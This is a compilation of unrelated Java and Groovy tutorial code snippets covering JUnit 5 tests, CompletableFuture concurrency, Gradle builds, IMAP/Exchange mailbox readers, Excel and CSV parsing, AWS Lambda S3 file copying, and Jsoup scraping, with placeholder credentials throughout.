  testCompile "org.junit.jupiter:junit-jupiter-api:$junitJupiterVersion"
  testCompile "org.junit.jupiter:junit-jupiter-params:$junitJupiterVersion"
  testRuntime "org.junit.jupiter:junit-jupiter-engine:$junitJupiterVersion"
}

test {
  useJUnitPlatform()

  reports {
    html.enabled = true
  }

  systemProperties = System.properties
}

--------------------------------------------------------------------------------------------------------
@Test
@DisplayName("Should assert all person attributes at once")
void shouldAssertAllPersonAttributes() {
  assertAll("person",
    () -> assertEquals("josdem", person.getNickname()),
    () -> assertEquals("joseluis.delacruz@gmail.com", person.getEmail())
  );
}

@Test
@DisplayName("Should throw an exception")
public void shouldThrowNullPointerException() {
  Person person = null;
  assertThrows(NullPointerException.class, () -> person.getNickname());
}


import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.logging.Logger;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInfo;

class StandardTest {

  private static final Logger log = Logger.getLogger(StandardTest.class.getName());

  @BeforeAll
  static void setup() {
    log.info("Before any test execution");
  }

  @BeforeEach
  void init() {
    log.info("Before each test execution");
  }

  @Test
  @DisplayName("succeed test case")
  void succeedingTest(TestInfo testInfo) {
    log.info(String.format("Running %s ...", testInfo.getDisplayName()));
    assertTrue(true, () -> "Always passing this test");
  }

  @AfterEach
  void finish() {
    log.info("After each test execution");
  }

  @AfterAll
  static void tearDown() {
    log.info("After all test execution");
  }

}

import static org.junit.jupiter.api.Assumptions.assumeTrue;
import static org.junit.jupiter.api.Assumptions.assumingThat;
import static org.junit.jupiter.api.Assertions.assertEquals;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import java.util.logging.Logger;

class AssumptionShowTest {

  private final Logger log = Logger.getLogger(AssumptionShowTest.class.getName());
  private final Person person = new Person("josdem", "joseluis.delacruz@gmail.com");

  @Test
  @DisplayName("Assume that is a Gmail account")
  void shouldKnowIfIsGmailAccount(){
    assumeTrue(person.getEmail().endsWith("gmail.com"));
    log.info("Test continues ...");
    assertEquals("josdem", person.getNickname());
  }

   @Test
   @DisplayName("Assuming something based in conditions")
   void testAssumingThat() {
     assumingThat(2 > 1, () -> log.info("This should happen!"));
     assumingThat(2 < 1, () -> log.info("This should never happen!"));
   }

}

@Test
@DisplayName("Should run if DEV environment")
@EnabledIfSystemProperty(named = "environment", matches = "DEV")
void shouldRunIfDevelopmentEnvironment(){
  log.info("Running: Conditions if is development");
  assertTrue(true);
}
@Test
@DisplayName("Should run if Monday")
@EnabledIf("(java.time.LocalDate).now().getDayOfWeek() == 'MONDAY'")
void shouldRunIfMonday() {
  log.info("Running: Conditions if is Monday");
  assertTrue(true);
}
@Test
@EnabledOnOs({ LINUX, MAC })
void shouldRunOnLinuxOrMac() {
  log.info("Running: Conditions if Linux or Mac");
  assertTrue(true);
}



import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.assertNotNull;

import java.util.EnumSet;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.CsvFileSource;

import java.util.logging.Logger;

class ParameterizedShowTest {

  private PalindromeEvaluator evaluator = new PalindromeEvaluator();
  private final Logger log = Logger.getLogger(ParameterizedShowTest.class.getName());

  @DisplayName("Allow string as parameters")
  @ParameterizedTest
  @ValueSource(strings = { "radar", "anitalavalatina" })
  void shouldAllowStringAsParamters(String word) {
    log.info("Running: Parameters as string");
    assertTrue(evaluator.isPalindrome(word));
  }

  @DisplayName("Allow enum as parameters")
  @ParameterizedTest
  @EnumSource(Environment.class)
  void shouldAllowEnumAsParameters(Environment environment) {
    assertNotNull(environment);
  }

  @DisplayName("Allow certain enum as parameters")
  @ParameterizedTest
  @EnumSource(value = Environment.class, names = {"DEVELOPMENT", "QA"})
  void shouldAllowCertainEnumAsParameters(Environment environment) {
    assertTrue(EnumSet.of(Environment.DEVELOPMENT, Environment.QA).contains(environment));
  }

  @DisplayName("Allow csv files as parameters")
  @ParameterizedTest
  @CsvFileSource(resources = "/csv.txt", numLinesToSkip = 1)
  void shouldAllowCsvFileSource(int id, String nickname, String email) {
    assertNotNull(id);
    assertTrue(nickname.length() > 3);
    assertTrue(email.endsWith("email.com"));
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.stream.IntStream;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.atomic.AtomicInteger;

public class ExecutorAtomic {

	private final static Integer MAX_PERIOD_TIME = 30;
	private AtomicInteger atomic = new AtomicInteger(0);
	private ExecutorService executor = Executors.newFixedThreadPool(3);

	private Integer start() throws InterruptedException {
		IntStream.range(0, 3).forEach(i -> executor.submit(atomic::incrementAndGet));
		executor.shutdown();

		executor.awaitTermination(MAX_PERIOD_TIME, TimeUnit.SECONDS);
		return atomic.get();
	}

	public static void main(String[] args) throws InterruptedException {
		Integer result = new ExecutorAtomic().start();
		System.out.println("I have been counting: " + result + " times");
	}
}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class ExecutorCompletableFuture {

  private final static Integer MAX_PERIOD_TIME = 30;

  private ExecutorService executor = Executors.newFixedThreadPool(3);

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Integer> completableFuture  = new CompletableFuture<Integer>();

    executor.submit(() -> {
      try{
        final Integer wait = 3;
        TimeUnit.SECONDS.sleep(wait);
        completableFuture.complete(wait);
      } catch (InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
    });

    final Integer result = completableFuture.get();
    executor.shutdown();

    System.out.println("I have been sleeping: " + result + " seconds");
    executor.awaitTermination(MAX_PERIOD_TIME, TimeUnit.SECONDS);
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new ExecutorCompletableFuture().start();
  }
}


import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class CompletableFutureRunAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Void> completableFuture  = CompletableFuture.runAsync( () -> {
      try{
        TimeUnit.SECONDS.sleep(3);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
    });
    completableFuture.get();
    System.out.println("I have been sleeping: 3 seconds");
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureRunAsync().start();
  }

}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class CompletableFutureSupplyAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<String> completableFuture  = CompletableFuture.supplyAsync( () -> {
      try{
        TimeUnit.SECONDS.sleep(3);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
      return "3 seconds";
    }).thenApply(message -> {
      return "I have been sleeping " + message;
    });
    System.out.println(completableFuture.get());
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureSupplyAsync().start();
  }

}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class CompletableFutureThenApplyAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Integer> completableFuture  = CompletableFuture.completedFuture(3).thenApplyAsync(wait -> {
      try{
        TimeUnit.SECONDS.sleep(wait);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
      return wait;
    });

    final Integer result = completableFuture.get();
    System.out.println("I have been sleeping: " + result + " seconds");
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureThenApplyAsync().start();
  }
}

--------------------------------------------------------------------------------------------------------
def configurationDirectory = "${System.getProperty('user.home')}/.mailboxi-reader"

buildscript {
  ext {
    springBootVersion = '1.5.1.RELEASE'
    cglibVersion = '3.2.4'
    javaMailVersion = '1.4'
    ewsJavaApiVersion = '2.0'
  }
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
  }
}

apply plugin: "groovy"
apply plugin: "application"
apply plugin: 'org.springframework.boot'

jar {
  baseName = 'mailbox-reader'
  version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
  mavenCentral()
}

dependencies {
  compile 'org.springframework.boot:spring-boot-starter'
  compile 'org.codehaus.groovy:groovy'
  compile "javax.mail:mail:$javaMailVersion"
  compile "com.microsoft.ews-java-api:ews-java-api:$ewsJavaApiVersion"
  testCompile 'org.springframework.boot:spring-boot-starter-test'
  testCompile 'org.spockframework:spock-spring'
  testCompile "cglib:cglib-nodep:$cglibVersion"
}

task settingEnvironment(type:Copy) {
  from configurationDirectory
  into 'src/main/resources'
  include "application.properties"
}

processResources.dependsOn "settingEnvironment"

--------------------------------------------------------------------------------------------------------

import org.springframework.stereotype.Service
import org.springframework.beans.factory.annotation.Value
import org.springframework.beans.factory.annotation.Autowired

import microsoft.exchange.webservices.data.core.ExchangeService
import microsoft.exchange.webservices.data.core.PropertySet
import microsoft.exchange.webservices.data.core.service.item.Item
import microsoft.exchange.webservices.data.core.service.folder.Folder
import microsoft.exchange.webservices.data.core.service.item.EmailMessage
import microsoft.exchange.webservices.data.credential.WebCredentials
import microsoft.exchange.webservices.data.credential.ExchangeCredentials
import microsoft.exchange.webservices.data.misc.ImpersonatedUserId
import microsoft.exchange.webservices.data.search.ItemView
import microsoft.exchange.webservices.data.search.FindItemsResults
import microsoft.exchange.webservices.data.property.complex.Mailbox
import microsoft.exchange.webservices.data.property.complex.FolderId
import microsoft.exchange.webservices.data.core.enumeration.misc.ConnectingIdType
import microsoft.exchange.webservices.data.autodiscover.IAutodiscoverRedirectionUrl
import microsoft.exchange.webservices.data.core.enumeration.property.WellKnownFolderName

import javax.annotation.PostConstruct

import com.jos.dem.mailbox.reader.service.InboxReader

import org.slf4j.Logger
import org.slf4j.LoggerFactory

@Service
class InboxReaderExchange implements InboxReader {

  private static final Integer MAX_ITEMS=50

  @Value('${ews.username}')
  String username
  @Value('${ews.password}')
  String password
  @Value('${ews.server}')
  String server
  @Value('${ews.protocol}')
  String protocol

  ExchangeService service = new ExchangeService()

  Logger log = LoggerFactory.getLogger(this.class)

  @PostConstruct
  void setup(){
    service.setUrl(new URI(server))
    ExchangeCredentials credentials = new WebCredentials(username, password)
    service.setCredentials(credentials)
    service.autodiscoverUrl(username,  new RedirectionUrlCallback(protocol))
  }

  void read(){
    Folder folder = Folder.bind(service, WellKnownFolderName.Inbox)
    FindItemsResults<Item> results = service.findItems(folder.getId(), new ItemView(MAX_ITEMS))
    for (Item item : results) {
      EmailMessage emailMessage = EmailMessage.bind(service, item.getId())
      log.info("Sender: ${emailMessage.getSender()}")
      log.info("Subject: ${emailMessage.getSubject()}")
    }
  }

}

class RedirectionUrlCallback implements IAutodiscoverRedirectionUrl {

  String protocol

  RedirectionUrlCallback(String protocol){
    this.protocol = protocol
  }
  public boolean autodiscoverRedirectionUrlValidationCallback(
    String redirectionUrl) {
    return redirectionUrl.toLowerCase().startsWith(protocol)
  }

}

username=user@gmail.com
password=secret
pop3.server=pop.gmail.com
pop3.port=995
imap.server=imap.gmail.com
imap.port=993
ews.username=user@outlook.com
ews.password=secret
ews.server=https://exchange/EWS/Exchange.asmx
ews.protocol=https://
--------------------------------------------------------------------------------------------------------
def configurationDirectory = "${System.getProperty('user.home')}/.mailbox-reader"

buildscript {
  ext {
    springBootVersion = '1.5.1.RELEASE'
    cglibVersion = '3.2.4'
    javaMailVersion = '1.4'
  }
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
  }
}

apply plugin: "groovy"
apply plugin: "application"
apply plugin: 'org.springframework.boot'

jar {
  baseName = 'mailbox-reader'
  version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
  mavenCentral()
}

dependencies {
  compile 'org.springframework.boot:spring-boot-starter'
  compile 'org.codehaus.groovy:groovy'
  compile "javax.mail:mail:$javaMailVersion"
  testCompile 'org.springframework.boot:spring-boot-starter-test'
  testCompile 'org.spockframework:spock-spring'
  testCompile "cglib:cglib-nodep:$cglibVersion"
}

task settingEnvironment(type:Copy) {
  from configurationDirectory
  into 'src/main/resources'
  include "application.properties"  
}

processResources.dependsOn "settingEnvironment"

package com.jos.dem.mailbox.reader.service.impl

import org.springframework.stereotype.Service
import org.springframework.beans.factory.annotation.Value
import org.springframework.beans.factory.annotation.Autowired

import javax.mail.Folder
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.NoSuchProviderException
import javax.mail.Session
import javax.mail.Store
import javax.annotation.PostConstruct

import com.jos.dem.mailbox.reader.service.InboxReader

import org.slf4j.Logger
import org.slf4j.LoggerFactory

@Service
class InboxReaderImap implements InboxReader {

  @Value('${username}')
  String username
  @Value('${password}')
  String password
  @Value('${imap.server}')
  String server
  @Value('${imap.port}')
  String port

  Properties properties = new Properties()
  Folder sentFolder
  Store store

  Logger log = LoggerFactory.getLogger(this.class)
	
  @PostConstruct
  void setup() {
  	properties.put("mail.imap.host", server);
  	properties.put("mail.imap.port", port);
  	properties.put("mail.store.protocol", "imaps");
  	Session emailSession = Session.getDefaultInstance(properties)
  	Store store = emailSession.getStore('imaps')
  	store.connect(server, username, password)
  	sentFolder = store.getFolder('[Gmail]/Sent Mail')
  	sentFolder.open(Folder.READ_ONLY)
  	log.info "Inbox Type: ${sentFolder.getType()}"
  	log.info "Folders: ${store.getDefaultFolder().list('*')}"
  }

  void read(){
  	Message[] messages = sentFolder.getMessages();
	log.info("messages.length---" + messages.length);
	for (int i = 0; i < messages.length; i++) {
	  Message message = messages[i];
	  log.info("--------------------------------")
	  log.info("Email Number " + (i + 1))
	  log.info("From: " + message.getFrom()[0])
	  log.info("Subject: " + message.getSubject())
	}
	sentFolder.close(false)
  }  
	
}

username=user@gmail.com
password=secret
pop3.server=pop.gmail.com
pop3.port=995
imap.server=imap.gmail.com
imap.port=993
--------------------------------------------------------------------------------------------------------
spring init --build=gradle --language=groovy excel-filter-reader

buildscript {
	ext {
		springBootVersion = '1.5.1.RELEASE'
		apachePoiVersion = '3.15'
		spockVersion = '1.1-groovy-2.4-rc-3'
	}
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
	}
}

apply plugin: 'groovy'
apply plugin: 'org.springframework.boot'

jar {
	baseName = 'apache-filter-reader'
	version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
	mavenCentral()
}


dependencies {
	compile 'org.springframework.boot:spring-boot-starter'
	compile 'org.codehaus.groovy:groovy'
	compile "org.apache.poi:poi:$apachePoiVersion"
	compile "org.apache.poi:poi-ooxml:$apachePoiVersion"
	testCompile "org.spockframework:spock-core:$spockVersion"
	testCompile 'org.springframework.boot:spring-boot-starter-test'
}

import org.apache.poi.ss.usermodel.Row
import org.apache.poi.ss.usermodel.Cell
import org.apache.poi.ss.usermodel.Sheet
import org.apache.poi.ss.usermodel.Workbook
import org.apache.poi.ss.usermodel.CellType
import org.apache.poi.xssf.usermodel.XSSFWorkbook

class ExcelFilterReader {

	List<String> readRows(Integer numberOfRows, File excelFile){
		List content = new ArrayList<ArrayList<String>>()
		List line = new ArrayList<String>()
		try{
			FileInputStream fileInputStream = new FileInputStream(excelFile)
			Workbook workbook = new XSSFWorkbook(fileInputStream)
			Sheet sheet = workbook.getSheetAt(0)

			for (Row row : sheet) {
				line = new ArrayList<String>()
				if(!isHidden(row)){
					for (Cell cell : row) {
						if (cell.getCellTypeEnum() == CellType.STRING) {
							line.add(cell.getStringCellValue())
							} else if (cell.getCellTypeEnum() == CellType.NUMERIC) {
								line.add(String.valueOf(cell.getNumericCellValue()))
							}
						}
						content.add(line)
					}
				}
		} catch(FileNotFoundException fne){
			  throw new ExcelException(fne.getMessage(), fne)
		} catch(IOException ioe){
				throw new ExcelException(ioe.getMessage(), ioe)
		}

		return content
  }

  private Boolean isHidden(Row row){
    row.getZeroHeight()
  }

}

class ExcelException extends RuntimeException {

	ExcelException(String message){
		super(message)
	}

	ExcelException(String message, Throwable cause){
		super(message, cause)
	}
	
}


import spock.lang.Specification

class ExcelFilterReaderSpec extends Specification {

  ExcelFilterReader excelReader = new ExcelFilterReader()

	void "should read filtered Excel rows"(){
		given:"Rows to read"
      Integer numberOfRows = 5
    and:"An excel file"
      File excelFile = new File("src/test/resources/input.xlsx")
    when:"We read rows"
      List<List<String>> result = excelReader.readRows(numberOfRows, excelFile)
    then:"We expect to get content"
    result.size() == 3
    result.get(0) == ['Name', 'Email', 'Ranking']
    result.get(1) == ['josdem','joseluis.delacruz@gmail.com','5.0']
    result.get(2) == ['martin','martinv@email.com','5.0']
  }	

} 
--------------------------------------------------------------------------------------------------------
lazybones create java-basic excel-reader

ext.apachePoiVersion = '3.15'
ext.groovyVersion = '2.4.8'
ext.spockVersion = '1.1-groovy-2.4-rc-3'

apply plugin: "java"
apply plugin: 'groovy'
apply plugin: "application"

repositories {
  mavenCentral()
}

dependencies {
  compile "org.apache.poi:poi:$apachePoiVersion"
  compile "org.apache.poi:poi-ooxml:$apachePoiVersion"
  testCompile "org.codehaus.groovy:groovy:$groovyVersion"
  testCompile "org.spockframework:spock-core:$spockVersion"
}

import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.FileNotFoundException;

import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;

public class ExcelReader {

  List<String> readRows(Integer numberOfRows, File excelFile){
    List content = new ArrayList<ArrayList<String>>();
    List line = new ArrayList<String>();
    try{
      FileInputStream fileInputStream = new FileInputStream(excelFile);
      Workbook workbook = new XSSFWorkbook(fileInputStream);
      Sheet sheet = workbook.getSheetAt(0);

      for (Row row : sheet) {
        line = new ArrayList<String>();
        for (Cell cell : row) {
          if (cell.getCellTypeEnum() == CellType.STRING) {
            line.add(cell.getStringCellValue());
          } else if (cell.getCellTypeEnum() == CellType.NUMERIC) {
            line.add(String.valueOf(cell.getNumericCellValue()));
          }
        }
        content.add(line);
      }
    } catch(FileNotFoundException fne){
      throw new ExcelException(fne.getMessage(), fne);
    } catch(IOException ioe){
      throw new ExcelException(ioe.getMessage(), ioe);
    }

    return content;
  }

}

public class ExcelException extends RuntimeException {

  ExcelException(String message){
    super(message);
  }

  ExcelException(String message, Throwable cause){
    super(message, cause);
  }

}


import spock.lang.Specification

class ExcelReaderSpec extends Specification {

  ExcelReader excelReader = new ExcelReader()

  void "should read Excel rows"(){
    given:"Rows to read"
      Integer numberOfRows = 5
    and:"An excel file"
      File excelFile = new File("src/test/resources/input.xlsx")
    when:"We read rows"
      List<List<String>> result = excelReader.readRows(numberOfRows, excelFile)
    then:"We expect to get content"
    result.size() == 4
    result.get(0) == ['Name', 'Email', 'Ranking']
    result.get(1) == ['josdem','joseluis.delacruz@gmail.com','5.0']
    result.get(2) == ['eric','erich@email.com','5.0']
    result.get(3) == ['martin','martinv@email.com','5.0']
  }

}
--------------------------------------------------------------------------------------------------------
lazybones create java-basic csv-apache-commons

ext.apacheCSVVersion = '1.4'
ext.groovyVersion = '2.4.8'
ext.spockVersion = '1.1-groovy-2.4-rc-3'

apply plugin: "java"
apply plugin: "groovy"
apply plugin: "application"

version = '0.0.1'

task buildJar(type: Jar) {
  manifest {
    attributes 'Implementation-Title': 'Read Write an CSV file with Apache Commons',
    'Implementation-Version': version,
    'Main-Class': 'example.Application'
  }
  baseName = project.name + '-all'
  from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
  with jar
}

repositories {
  mavenCentral()
}

dependencies {
  compile "org.apache.commons:commons-csv:$apacheCSVVersion"
  testCompile "org.codehaus.groovy:groovy:$groovyVersion"
  testCompile "org.spockframework:spock-core:$spockVersion"
}

import java.io.FileReader;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;

import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVRecord;

public class CsvFileReader {

  public List<List<String>> read(String path){
    List elements = new ArrayList<List<String>>();
    try{
      FileReader input = new FileReader(path);
      Iterable<CSVRecord> records = CSVFormat.TDF.withHeader("id", "name", "email").parse(input);
      for (CSVRecord record : records) {
        List<String> row = new ArrayList<String>();
        String id = record.get("id");
        String name = record.get("name");
        String email = record.get("email");
        row.add(id);
        row.add(name);
        row.add(email);
        elements.add(row);
      }
    } catch(IOException ioe){
      throw new CsvException(ioe.getMessage());
    }
    return elements;
  }

}

import java.lang.RuntimeException;

public class CsvException extends RuntimeException {

  CsvException(String message){
    super(message);
  }

}

public class Target {
  private String id;
  private String name;
  private String email;

  public void setId(String id){
    this.id = id;
  }

  public String getId(){
    return id;
  }

  public void setName(String name){
    this.name = name;
  }

  public String getName(){
    return name;
  }

  public void setEmail(String email){
    this.email = email;
  }

  public String getEmail(){
    return email;
  }

}import java.io.FileWriter;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;

import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVRecord;
import org.apache.commons.csv.CSVPrinter;

public class CsvFileWriter {

  private static final String NEW_LINE_SEPARATOR = "\n";

  public void write(List<Target> targets, String path){
    List elements = new ArrayList<List<String>>();
    try{
      FileWriter output = new FileWriter(path);
      CSVPrinter printer = CSVFormat.TDF.withHeader("id", "name", "email").withRecordSeparator(NEW_LINE_SEPARATOR).print(output);

      for(Target target: targets){
        List<String> record = new ArrayList<String>();
        record.add(target.getId());
        record.add(target.getName());
        record.add(target.getEmail());
        printer.printRecord(record);
      }

      output.flush();
      output.close();
    } catch(IOException ioe){
      throw new CsvException(ioe.getMessage());
    }
  }

}

import spock.lang.Specification;

class CsvFileReaderSpec extends Specification {

  CsvFileReader reader = new CsvFileReader()

  void "Should read csv file"(){
    given:"A path"
    String path = 'src/test/resources/csv.txt'
    when:
    def result = reader.read(path);
    then:
    result.size() == 4
    result.get(0) == ['id','name','email']
    result.get(1) == ['1','eric','erich@email.com']
    result.get(2) == ['2','martin','martinv@email.com']
    result.get(3) == ['3','josdem','josdem@email.com']
  }

}


import spock.lang.Specification;

class CsvFileWriterSpec extends Specification {

  CsvFileWriter writer = new CsvFileWriter()

  void "Should write to a csv file"(){
    given:"A path"
      String path = 'src/test/resources/csv_written.txt'
    and:"Some targets"
      Target t1 = new Target(id:'1',name:'eric',email:'erich@email.com')
      Target t2 = new Target(id:'2',name:'martin',email:'martinv@email.com')
      Target t3 = new Target(id:'3',name:'josdem',email:'josdem@email.com')
      List<Target> targets = [t1,t2,t3]
    when:
    writer.write(targets,path);
    File file = new File(path)
    then:"We expect file exist"
    List<String> lines = []
    file.eachLine { line ->
      lines << line
    }
    lines.get(0) == 'id name  email'
    lines.get(1) == '1  eric  erich@email.com'
    lines.get(2) == '2  martin  martinv@email.com'
    lines.get(3) == '3  josdem  josdem@email.com'
  }
}
--------------------------------------------------------------------------------------------------------
import java.io.File;

import org.apache.commons.configuration2.Configuration;
import org.apache.commons.configuration2.builder.fluent.Configurations;
import org.apache.commons.configuration2.ex.ConfigurationException;

public class ConfigurationLauncher {

  private void readProperties(){
    Configurations configurations = new Configurations();
    try{
      Configuration configuration = configurations.properties(new File("configuration.properties"));
      String username = configuration.getString("username");
      String password = configuration.getString("password");
      System.out.println("{username:" + username + ",password:"+ password + "}");
    } catch (ConfigurationException cex) {
      System.out.println("Error: " + cex.getMessage());
    }
  }

  public static void main(String[] args){
    new ConfigurationLauncher().readProperties();
  }
}
--------------------------------------------------------------------------------------------------------

import java.io.InputStream;
import com.amazonaws.services.lambda.runtime.events.S3Event;
import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.LambdaLogger;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import com.amazonaws.services.s3.model.ObjectMetadata;

public class BucketFileTransfer implements RequestHandler<S3Event, Integer> {

  @Override
  public Integer handleRequest(S3Event event, Context context) {
    LambdaLogger logger = context.getLogger();
    logger.log("STARTING to copy file");

    MetadataFileHelper metadataFileHelper = new MetadataFileHelper(event);
    String sourceBucket = metadataFileHelper.getSourceBucketName();
    String sourceKey = metadataFileHelper.getSourceBucketKey();
    String destinationBucket = metadataFileHelper.getDestinationBucketName();;
    String destinationKey = metadataFileHelper.getDestinationBucketKey();

    AWSClient awsClient = new AWSClient(sourceBucket, sourceKey);
    InputStream objectData = awsClient.getS3Object().getObjectContent();
    ObjectMetadata meta = awsClient.getS3Object().getObjectMetadata();
    awsClient.getS3Client().putObject(destinationBucket, destinationKey, objectData, meta);
    return ResultCode.OK;
  }

}

import com.amazonaws.services.lambda.runtime.events.S3Event;
import com.amazonaws.services.s3.event.S3EventNotification.S3Entity;

public class MetadataFileHelper {

  private S3Event event;

  public MetadataFileHelper(S3Event event){
    this.event = event;
  }

  private S3Entity getBucketEntity(){
    return this.event.getRecords().get(0).getS3();
  }

  public String getSourceBucketName() {
    return getBucketEntity().getBucket().getName();
  }

  public String getSourceBucketKey() {
    return getBucketEntity().getObject().getKey();
  }

  public String getDestinationBucketName() {
    return "bucket-s3-destination";
  }

  public String getDestinationBucketKey() {
    return "copied-" + getBucketEntity().getObject().getKey();
  }

}


import com.amazonaws.ClientConfiguration;
import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.S3Object;
import com.amazonaws.services.s3.model.GetObjectRequest;

public class AWSClient {

  String sourceBucket;
  String sourceKey;
  AmazonS3 s3Client;

  public AWSClient(String sourceBucket, String sourceKey){
    this.sourceBucket = sourceBucket;
    this.sourceKey = sourceKey;
    AWSCredentials credentials = new BasicAWSCredentials("Access Key ID", "Secret Access Key");
    ClientConfiguration clientConfig = new ClientConfiguration();
    this.s3Client = new AmazonS3Client(credentials, clientConfig);
  }

  public S3Object getS3Object() {
    return getS3Client().getObject(new GetObjectRequest(sourceBucket, sourceKey));
  }

  public AmazonS3 getS3Client(){
    return this.s3Client;
  }
}

aws lambda invoke \
--invocation-type Event \
--function-name s3-aws-lambda \
--region us-west-1 \
--payload file://inputfile.txt \
outputfile.txt
--------------------------------------------------------------------------------------------------------
lazybones create java-basic hello-aws-lambda

apply plugin: "java"
apply plugin: "application"

version = '0.0.1'

task buildJar(type: Jar) {
  manifest {
    attributes 'Implementation-Title': 'Hello AWS Lambda',
    'Implementation-Version': version,
    'Main-Class': 'example.Hello'
  }
  baseName = project.name + '-all'
  from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
  with jar
}

repositories {
  mavenCentral()
}

dependencies {
  compile 'com.amazonaws:aws-lambda-java-core:1.1.0'
  compile 'com.amazonaws:aws-lambda-java-events:1.1.0'
}

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;

public class Hello implements RequestHandler<HelloRequest, HelloResponse> {

  @Override
  public HelloResponse handleRequest(HelloRequest input, Context context) {
    return new HelloResponse(input.getInput());
  }

}

public class HelloRequest {

  private String input;

  public HelloRequest(String input) {
    this.input = input;
  }

  public HelloRequest() {
  }

  public String getInput() {
    return input;
  }

  public void setInput(String input) {
    this.input = input;
  }
}
--------------------------------------------------------------------------------------------------------
Document doc = Jsoup.connect("http://stackoverflow.com").userAgent("Mozilla").get(); for (Element e: doc.select("a.question-hyperlink")) {     System.out.println(e.attr("abs:href"));     System.out.println(e.text());     System.out.println(); }
Document doc = Jsoup.parseBodyFragment(bodyFragment);     String link = doc             .select("div > a")             .first()             .attr("href");

// load file     File inputFile = new File(filePath);     // parse file as HTML document     Document doc = Jsoup.parse(filePath, ENCODING);     // select element by <a>     Elements elements = doc.select("a");

Connection.Response loginResponse = Jsoup.connect("yourWebsite.com/loginUrl")                                         .userAgent(USER_AGENT)                                         .data("username", "yourUsername")                                         .data("password", "yourPassword")                                         .method(Method.POST)                                         .execute();

// # Constants used in this example final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"; final String LOGIN_FORM_URL = "https://github.com/login"; final String LOGIN_ACTION_URL = "https://github.com/session"; final String USERNAME = "yourUsername"; final String PASSWORD = "yourPassword"; // # Go to login page and grab cookies sent by server Connection.Response loginForm = Jsoup.connect(LOGIN_FORM_URL)                                      .method(Connection.Method.GET)                                      .userAgent(USER_AGENT)                                      .execute(); Document loginDoc = loginForm.parse(); // this is the document containing response html HashMap<String, String> cookies = new HashMap<>(loginForm.cookies()); // save the cookies to be passed on to next request // # Prepare login credentials String authToken = loginDoc.select("#login > form > div:nth-child(1) > 

